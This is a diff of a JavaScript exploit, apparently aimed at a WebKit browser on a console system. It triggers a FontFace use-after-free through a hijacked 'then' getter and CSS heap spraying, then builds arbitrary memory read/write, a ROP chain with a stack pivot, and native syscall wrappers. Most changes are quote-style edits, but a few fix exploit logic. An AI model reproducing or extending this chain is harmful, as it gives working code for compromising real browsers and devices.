@@ -26,7 +26,7 @@ const mem = {
   free_all() {
     for (const ab of this.allocs) {
       // fix to avoid crash
-      if (ab.hasOwnProperty("m_data")) {
+      if (ab.hasOwnProperty('m_data')) {
         const ab_addr = arw.addrof(ab);
 
         let m_impl = arw.view(ab_addr).getBInt(0x10, true);
@@ -64,7 +64,7 @@ const mem = {
 
     const len = u8.indexOf(0);
     if (len === -1) {
-      throw new Error("Invalid null-terminated string !!");
+      throw new Error('Invalid null-terminated string !!');
     }
 
     return len;
@@ -77,7 +77,7 @@ const arw = {
   victim: new DataView(new ArrayBuffer(0x30)),
   view(addr) {
     if (addr.eq(0)) {
-      throw new Error("Empty addr !!");
+      throw new Error('Empty addr !!');
     }
 
     this.master[4] = addr.lo;
@@ -104,7 +104,7 @@ const rop = {
     this.frame.reset();
   },
   execute() {
-    rop.frame.set_value("jmp_rax", gadgets.POP_RAX_RET);
+    rop.frame.set_value('jmp_rax', gadgets.POP_RAX_RET);
 
     this.stack.prepare(this.insts, this.frame);
     this.pivot.prepare(this.stack.sp);
@@ -132,17 +132,17 @@ const gadgets = new Proxy(constants, {
 class SyscallError extends Error {
   constructor(message) {
     super(`${message}\n\terrno ${errno()}: ${strerror()}`);
-    this.name = "SyscallError";
+    this.name = 'SyscallError';
   }
 }
 class Stack {
   constructor(size) {
     if (size % 8 !== 0) {
-      throw new Error("Invalid stack size, not aligned by 8 bytes");
+      throw new Error('Invalid stack size, not aligned by 8 bytes');
     }
 
     if (size < 0x1000) {
-      throw new Error("Invalid stack size, minimal size is 0x1000 to init ROP");
+      throw new Error('Invalid stack size, minimal size is 0x1000 to init ROP');
     }
 
     this.view = new DataView(new ArrayBuffer(size));
@@ -167,14 +167,14 @@ class Stack {
 
     for (let i = insts.length - 1; i >= 0; i--) {
       if (this.current < 1) {
-        throw new Error("Stack full !!");
+        throw new Error('Stack full !!');
       }
 
       let inst = insts[i];
 
-      if (typeof inst === "string") {
-        if (typeof frame === "undefined") {
-          throw new Error("Unable to resolve symbol without frame !!");
+      if (typeof inst === 'string') {
+        if (typeof frame === 'undefined') {
+          throw new Error('Unable to resolve symbol without frame !!');
         }
 
         inst = frame.instof(inst);
@@ -192,7 +192,7 @@ class Frame {
     }
 
     if (list.length === 0) {
-      throw new Error("Empty frame length !!");
+      throw new Error('Empty frame length !!');
     }
 
     this.pop_view = new DataView(new ArrayBuffer(8));
@@ -201,7 +201,7 @@ class Frame {
     for (let i = 0; i < list.length; i++) {
       const name = list[i];
 
-      if (typeof name !== "string") {
+      if (typeof name !== 'string') {
         throw new TypeError(`${name} not a string !!`);
       }
 
@@ -220,7 +220,7 @@ class Frame {
   instof(name) {
     let as_value = false;
 
-    if (name.startsWith("[") && name.endsWith("]")) {
+    if (name.startsWith('[') && name.endsWith(']')) {
       name = name.slice(1, -1);
       as_value = true;
     }
@@ -333,7 +333,7 @@ class NativeFunction {
 
     if (input instanceof BInt) {
       this.addr = input;
-    } else if (typeof input === "number") {
+    } else if (typeof input === 'number') {
       if (!syscalls.has(input)) {
         throw new Error(`Syscall ${input} not found !!`);
       }
@@ -344,16 +344,16 @@ class NativeFunction {
 
   invoke() {
     if (arguments.length > 6) {
-      throw new Error("More than 6 arguments is not supported !!");
+      throw new Error('More than 6 arguments is not supported !!');
     }
 
     rop.reset();
 
-    rop.frame.set_value("rip", this.addr);
-    rop.frame.set_value("rax", 0);
+    rop.frame.set_value('rip', this.addr);
+    rop.frame.set_value('rax', 0);
 
     const ctx = [];
-    const regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"];
+    const regs = ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9'];
 
     for (let i = 0; i < regs.length; i++) {
       const reg = regs[i];
@@ -361,10 +361,10 @@ class NativeFunction {
       let value = i in arguments ? arguments[i] : 0;
 
       switch (typeof value) {
-        case "boolean":
-        case "number":
+        case 'boolean':
+        case 'number':
           break;
-        case "string":
+        case 'string':
           value = value.cstr();
           ctx.push(value);
           break;
@@ -385,18 +385,18 @@ class NativeFunction {
 
     let result;
     if (this.ret) {
-      result = rop.frame.get_value("rax");
+      result = rop.frame.get_value('rax');
 
       switch (this.ret) {
-        case "bint":
+        case 'bint':
           break;
-        case "number":
+        case 'number':
           result = result.i;
           break;
-        case "boolean":
+        case 'boolean':
           result = result.eq(1);
           break;
-        case "string":
+        case 'string':
           result = String.from(result);
           break;
         default:
@@ -409,7 +409,7 @@ class NativeFunction {
 
   chain() {
     if (arguments.length < 1) {
-      throw new Error("insts argument is required to chain with !!");
+      throw new Error('insts argument is required to chain with !!');
     }
 
     if (!Array.isArray(arguments[0])) {
@@ -417,10 +417,17 @@ class NativeFunction {
     }
 
     if (arguments.length > 7) {
-      throw new Error("More than 6 arguments is not supported !!");
+      throw new Error('More than 6 arguments is not supported !!');
     }
 
-    const regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_RET];
+    const regs = [
+      gadgets.POP_RDI_RET,
+      gadgets.POP_RSI_RET,
+      gadgets.POP_RDX_RET,
+      gadgets.POP_RCX_RET,
+      gadgets.POP_R8_RET,
+      gadgets.POP_R9_RET,
+    ];
 
     const insts = arguments[0];
 
@@ -435,10 +442,10 @@ class NativeFunction {
       let value = arguments[i];
 
       switch (typeof value) {
-        case "boolean":
-        case "number":
+        case 'boolean':
+        case 'number':
           break;
-        case "string":
+        case 'string':
           value = value.cstr();
           break;
         default:
@@ -468,11 +475,11 @@ class Struct {
     }
 
     if (!Array.isArray(fields)) {
-      throw new Error("Input fields is not an array !!");
+      throw new Error('Input fields is not an array !!');
     }
 
     if (fields.length === 0) {
-      throw new Error("Empty fields array !!");
+      throw new Error('Empty fields array !!');
     }
 
     let offset = 0;
@@ -523,26 +530,26 @@ class Struct {
           const buf = ArrayBuffer.from(addr, size);
 
           switch (type) {
-            case "Int8":
+            case 'Int8':
               return new Int8Array(buf);
-            case "Uint8":
+            case 'Uint8':
               return new Uint8Array(buf);
-            case "Int16":
+            case 'Int16':
               return new Int16Array(buf);
-            case "Uint16":
+            case 'Uint16':
               return new Uint16Array(buf);
-            case "Int32":
+            case 'Int32':
               return new Int32Array(buf);
-            case "Uint32":
+            case 'Uint32':
               return new Uint32Array(buf);
-            case "Int64":
-            case "Uint64":
+            case 'Int64':
+            case 'Uint64':
               throw new Error(`type ${field.type} not supported !!`);
             default:
               throw new Error(`Invalid type ${field.type}`);
           }
         } else {
-          if (type.endsWith("*")) {
+          if (type.endsWith('*')) {
             type = type.slice(0, -1);
             addr = arw.view(target.addr).getBInt(field.offset, true);
           }
@@ -553,20 +560,20 @@ class Struct {
           }
 
           switch (type) {
-            case "Int8":
+            case 'Int8':
               return arw.view(addr).getInt8(0, true);
-            case "Uint8":
+            case 'Uint8':
               return arw.view(addr).getUint8(0, true);
-            case "Int16":
+            case 'Int16':
               return arw.view(addr).getInt16(0, true);
-            case "Uint16":
+            case 'Uint16':
               return arw.view(addr).getUint16(0, true);
-            case "Int32":
+            case 'Int32':
               return arw.view(addr).getInt32(0, true);
-            case "Uint32":
+            case 'Uint32':
               return arw.view(addr).getUint32(0, true);
-            case "Int64":
-            case "Uint64":
+            case 'Int64':
+            case 'Uint64':
               return arw.view(addr).getBInt(0, true);
             default:
               throw new Error(`Invalid type ${field.type}`);
@@ -576,8 +583,8 @@ class Struct {
       set: (target, prop, value) => {
         if (!isNaN(prop)) {
           const i = Number(prop);
-          if (!value.hasOwnProperty("struct")) {
-            throw new Error("Value is not a Struct");
+          if (!value.hasOwnProperty('struct')) {
+            throw new Error('Value is not a Struct');
           }
 
           if (target.struct.name !== value.struct.name) {
@@ -596,7 +603,7 @@ class Struct {
             const size = field.size * field.count;
 
             if (!ArrayBuffer.isView(value)) {
-              throw new Error("Value is not a TypedArray");
+              throw new Error('Value is not a TypedArray');
             }
 
             if (value.buffer.byteLength !== size) {
@@ -605,9 +612,9 @@ class Struct {
 
             mem.copy(addr, value.buffer.getBackingStore(), size);
           } else {
-            if (type.endsWith("*")) {
+            if (type.endsWith('*')) {
               if (!(value instanceof BInt)) {
-                throw new Error("Value is not a pointer");
+                throw new Error('Value is not a pointer');
               }
 
               arw.view(target.addr).setBInt(field.offset, value, true);
@@ -617,8 +624,8 @@ class Struct {
             if (structs.has(type)) {
               const struct = structs.get(type);
 
-              if (!value.hasOwnProperty("addr")) {
-                throw new Error("Value is not a Struct");
+              if (!value.hasOwnProperty('addr')) {
+                throw new Error('Value is not a Struct');
               }
 
               mem.copy(addr, value.addr, struct.sizeof);
@@ -626,26 +633,26 @@ class Struct {
             }
 
             switch (type) {
-              case "Int8":
+              case 'Int8':
                 arw.view(addr).setInt8(0, value, true);
                 break;
-              case "Uint8":
+              case 'Uint8':
                 arw.view(addr).setUint8(0, value, true);
                 break;
-              case "Int16":
+              case 'Int16':
                 arw.view(addr).setInt16(0, value, true);
                 break;
-              case "Uint16":
+              case 'Uint16':
                 arw.view(addr).setUint16(0, value, true);
                 break;
-              case "Int32":
+              case 'Int32':
                 arw.view(addr).setInt32(0, value, true);
                 break;
-              case "Uint32":
+              case 'Uint32':
                 arw.view(addr).setUint32(0, value, true);
                 break;
-              case "Int64":
-              case "Uint64":
+              case 'Int64':
+              case 'Uint64':
                 arw.view(addr).setBInt(0, value, true);
                 break;
               default:
@@ -660,7 +667,7 @@ class Struct {
   }
 
   static type_size(type) {
-    if (type.endsWith("*")) {
+    if (type.endsWith('*')) {
       return 8;
     } else if (structs.has(type)) {
       return structs.get(type).sizeof;
@@ -670,7 +677,7 @@ class Struct {
   }
 
   static type_align(type) {
-    if (type.endsWith("*")) {
+    if (type.endsWith('*')) {
       return 8;
     } else if (structs.has(type)) {
       return structs.get(type).alignof;
@@ -680,7 +687,7 @@ class Struct {
   }
 
   static primitive_size(type) {
-    const bits = type.replace(/\D/g, "");
+    const bits = type.replace(/\D/g, '');
     if (bits % 8 !== 0) {
       throw new Error(`Invalid primitive type ${type}`);
     }
@@ -718,11 +725,11 @@ String.prototype.cstr = function () {
 //#endregion
 //#region Static
 String.from = function (addr, len) {
-  if (addr.eq(0)) return "";
+  if (addr.eq(0)) return '';
 
   len = len || mem.strlen(addr);
 
-  if (len === 0) return "";
+  if (len === 0) return '';
 
   const u8 = new Uint8Array(len);
 
@@ -733,7 +740,7 @@ String.from = function (addr, len) {
 
 ArrayBuffer.from = function (addr, len = -1) {
   if (addr.eq(0)) {
-    throw new RangeError("Empty addr !!");
+    throw new RangeError('Empty addr !!');
   }
 
   const ab = mem.alloc(0, false);
@@ -764,16 +771,16 @@ ArrayBuffer.from = function (addr, len = -1) {
 //#endregion
 //#region Functions
 function errno() {
-  if (!fn.hasOwnProperty("_error")) {
-    throw new Error("_error undefined !!");
+  if (!fn.hasOwnProperty('_error')) {
+    throw new Error('_error undefined !!');
   }
 
   return arw.view(fn._error.invoke()).getUint32(0, true);
 }
 
 function strerror() {
-  if (!fn.hasOwnProperty("_strerror")) {
-    throw new Error("strerror undefined !!");
+  if (!fn.hasOwnProperty('_strerror')) {
+    throw new Error('strerror undefined !!');
   }
 
   return fn._strerror.invoke(errno());
@@ -797,7 +804,7 @@ function nsleep(nsec) {
 }
 
 async function init_rw() {
-  logger.info("Initiate UAF...");
+  logger.info('Initiate UAF...');
 
   const spray_count = 0xb0;
   const spray_font_rule = `
@@ -818,14 +825,14 @@ async function init_rw() {
   const abs = new Array(spray_count);
 
   // FontFace A with a local source so it resolves synchronously
-  const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });
+  const A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
 
   document.fonts.add(A);
 
   // Register a DeferredPromise on A
   void A.loaded;
 
-  const style = document.createElement("style");
+  const style = document.createElement('style');
   document.head.appendChild(style);
 
   // Shape heap around B in order to reclaim it after free
@@ -847,7 +854,7 @@ async function init_rw() {
 
   const old_then = FontFace.prototype.then;
 
-  Object.defineProperty(FontFace.prototype, "then", {
+  Object.defineProperty(FontFace.prototype, 'then', {
     configurable: true,
     get() {
       if (this === A) {
@@ -861,7 +868,7 @@ async function init_rw() {
         for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
           const rule = style.sheet.cssRules[i];
 
-          if (rule.cssText.includes("spray")) {
+          if (rule.cssText.includes('spray')) {
             style.sheet.deleteRule(i);
           }
         }
@@ -887,36 +894,38 @@ async function init_rw() {
 
   // Loading 'AB' needs both U+0041 (from A) and U+0042 (from the CSS rule)
   // A resolves synchronously, firing the thenable check getter above
-  const fonts = await document.fonts.load("1em a, b", "AB");
-
-  logger.debug(`fonts: ${fonts}`);
-
-  Object.defineProperty(FontFace.prototype, "then", {
-    configurable: true,
-    value: old_then,
-  });
+  let fonts;
+  try {
+    fonts = await document.fonts.load('1em a, b', 'AB');
+    logger.debug(`fonts: ${fonts}`);
+  } finally {
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      value: old_then,
+    });
+  }
 
   // Check if both A and B are loaded
   if (fonts.length !== 2) {
-    throw new Error("Unable to reclaim UAF FontFace !!");
+    throw new Error('Unable to reclaim UAF FontFace !!');
   }
 
-  logger.info("UAF Achieved !!");
+  logger.info('UAF Achieved !!');
 
   let uaf_ab = undefined;
   let uaf_font = undefined;
 
   // UAF FontFace has default unicodeRange value U+0-10FFFF
   for (const font of fonts) {
-    if (font.unicodeRange === "U+0-10FFFF") {
-      logger.info("Found UAF FontFace !!");
+    if (font.unicodeRange === 'U+0-10FFFF') {
+      logger.info('Found UAF FontFace !!');
       uaf_font = font;
       break;
     }
   }
 
   if (uaf_font === undefined) {
-    throw new Error("Unable to find UAF error !!");
+    throw new Error('Unable to find UAF error !!');
   }
 
   fonts.length = 0;
@@ -925,14 +934,14 @@ async function init_rw() {
   for (const ab of abs) {
     const view = new DataView(ab);
     if (view.getBInt(8, true).eq(2)) {
-      logger.info("Found ArrayBuffer of UAF FontFace !!");
+      logger.info('Found ArrayBuffer of UAF FontFace !!');
       uaf_ab = ab;
       break;
     }
   }
 
   if (uaf_ab === undefined) {
-    throw new Error("Unable to find ArrayBuffer of UAF FontFace !!");
+    throw new Error('Unable to find ArrayBuffer of UAF FontFace !!');
   }
 
   abs.length = 0;
@@ -977,7 +986,7 @@ async function init_rw() {
 }
 
 async function init_arw(rw) {
-  logger.info("Initiate ARW...");
+  logger.info('Initiate ARW...');
 
   if (rw !== undefined) {
     // setup arw using rw
@@ -1013,7 +1022,7 @@ async function init_arw(rw) {
 
       const dv = new DataView(rw.read(start, 0x100));
 
-      for (let i = 0; i < dv.byteLength / 8; i += 8) {
+      for (let i = 0; i < dv.byteLength; i += 8) {
         if (dv.getUint32(i, true) === marker && dv.getUint32(i + 0x18, true) === 0xe) {
           const marker_addr = start.add(i);
           logger.info(`Found Array marker at ${marker_addr} !!`);
@@ -1066,7 +1075,7 @@ async function init_arw(rw) {
     const fake_addr = container_addr.add(0x10);
     logger.debug(`fake_addr: ${fake_addr}`);
 
-    const dummy_font = new FontFace("spray", "local(Helvetica)", {});
+    const dummy_font = new FontFace('spray', 'local(Helvetica)', {});
     const dummy_font_addr = rw.addrof(dummy_font);
     logger.debug(`dummy_font_addr: ${dummy_font_addr}`);
 
@@ -1177,11 +1186,11 @@ async function init_arw(rw) {
     g_NativeCodePoison = arw.view(webkit_base).getBInt(constants.wk_g_NativeCodePoison, true);
   }
 
-  logger.info("Achieved ARW !!");
+  logger.info('Achieved ARW !!');
 }
 
 function init_rop() {
-  logger.info("Initiate ROP...");
+  logger.info('Initiate ROP...');
 
   const math_expm1_addr = arw.addrof(Math.expm1);
   logger.debug(`math_expm1_addr: ${math_expm1_addr}`);
@@ -1222,70 +1231,70 @@ function init_rop() {
 
   rop.pivot = new Pivot();
   rop.stack = new Stack(0x2000);
-  rop.frame = new Frame(["jmp_rax", "rsp", "rax", "rip", "rdi", "rsi", "rdx", "rcx", "r8", "r9"]);
+  rop.frame = new Frame(['jmp_rax', 'rsp', 'rax', 'rip', 'rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9']);
 
   rop.insts.push(gadgets.POP_RAX_RET);
-  rop.insts.push(rop.frame.addrof("jmp_rax"));
+  rop.insts.push(rop.frame.addrof('jmp_rax'));
   rop.insts.push(gadgets.PUSH_RBP_JMP_QWORD_PTR_RAX);
 
-  rop.frame.store(rop.insts, "rsp");
+  rop.frame.store(rop.insts, 'rsp');
 
   rop.insts.push(gadgets.POP_RAX_RET);
-  rop.frame.valueof(rop.insts, "rax");
+  rop.frame.valueof(rop.insts, 'rax');
 
   rop.insts.push(gadgets.POP_RDI_RET);
-  rop.frame.valueof(rop.insts, "rdi");
+  rop.frame.valueof(rop.insts, 'rdi');
 
   rop.insts.push(gadgets.POP_RSI_RET);
-  rop.frame.valueof(rop.insts, "rsi");
+  rop.frame.valueof(rop.insts, 'rsi');
 
   rop.insts.push(gadgets.POP_RDX_RET);
-  rop.frame.valueof(rop.insts, "rdx");
+  rop.frame.valueof(rop.insts, 'rdx');
 
   rop.insts.push(gadgets.POP_RCX_RET);
-  rop.frame.valueof(rop.insts, "rcx");
+  rop.frame.valueof(rop.insts, 'rcx');
 
   rop.insts.push(gadgets.POP_R8_RET);
-  rop.frame.valueof(rop.insts, "r8");
+  rop.frame.valueof(rop.insts, 'r8');
 
   rop.insts.push(gadgets.POP_R9_RET);
-  rop.frame.valueof(rop.insts, "r9");
+  rop.frame.valueof(rop.insts, 'r9');
 
-  rop.frame.valueof(rop.insts, "rip");
+  rop.frame.valueof(rop.insts, 'rip');
 
-  rop.frame.store(rop.insts, "rax");
+  rop.frame.store(rop.insts, 'rax');
 
-  rop.frame.load(rop.insts, "rsp");
+  rop.frame.load(rop.insts, 'rsp');
   rop.insts.push(gadgets.PUSH_RAX_POP_RBP_RET);
   rop.insts.push(gadgets.POP_RAX_RET);
   rop.insts.push(0);
   rop.insts.push(gadgets.LEAVE_RET);
 
-  fn._error = new NativeFunction(_error_addr, "bint");
-  fn._strerror = new NativeFunction(strerror_addr, "string");
+  fn._error = new NativeFunction(_error_addr, 'bint');
+  fn._strerror = new NativeFunction(strerror_addr, 'string');
 
-  logger.info("Achieved ROP !!");
+  logger.info('Achieved ROP !!');
 }
 
 function init_syscalls() {
-  logger.info("Initiate SYSCALLS...");
+  logger.info('Initiate SYSCALLS...');
 
   scan_syscalls(libkernel_base);
 
   // syscall functions
-  fn.read = new NativeFunction(0x3, "bint");
-  fn.write = new NativeFunction(0x4, "bint");
-  fn.open = new NativeFunction(0x5, "number");
-  fn.close = new NativeFunction(0x6, "number");
-  fn.fstat = new NativeFunction(0xbd, "number");
-  fn.sysctl = new NativeFunction(0xca, "number");
-  fn.nanosleep = new NativeFunction(0xf0, "number");
-  fn.socket = new NativeFunction(0x61, "number");
-  fn.dlsym = new NativeFunction(0x24f, "number");
-  fn.dup = new NativeFunction(0x29, "number");
-  fn.getpid = new NativeFunction(0x14, "number");
+  fn.read = new NativeFunction(0x3, 'bint');
+  fn.write = new NativeFunction(0x4, 'bint');
+  fn.open = new NativeFunction(0x5, 'number');
+  fn.close = new NativeFunction(0x6, 'number');
+  fn.fstat = new NativeFunction(0xbd, 'number');
+  fn.sysctl = new NativeFunction(0xca, 'number');
+  fn.nanosleep = new NativeFunction(0xf0, 'number');
+  fn.socket = new NativeFunction(0x61, 'number');
+  fn.dlsym = new NativeFunction(0x24f, 'number');
+  fn.dup = new NativeFunction(0x29, 'number');
+  fn.getpid = new NativeFunction(0x14, 'number');
 
-  logger.info("Initiated SYSCALLS !!");
+  logger.info('Initiated SYSCALLS !!');
 }
 
 function scan_syscalls(base) {
@@ -1333,8 +1342,8 @@ function scan_syscalls(base) {
 }
 //#endregion
 //#region Structs
-const timespec = new Struct("timespec", [
-  { type: "Int64", name: "tv_sec" },
-  { type: "Int64", name: "tv_nsec" },
+const timespec = new Struct('timespec', [
+  { type: 'Int64', name: 'tv_sec' },
+  { type: 'Int64', name: 'tv_nsec' },
 ]);
 //#endregion
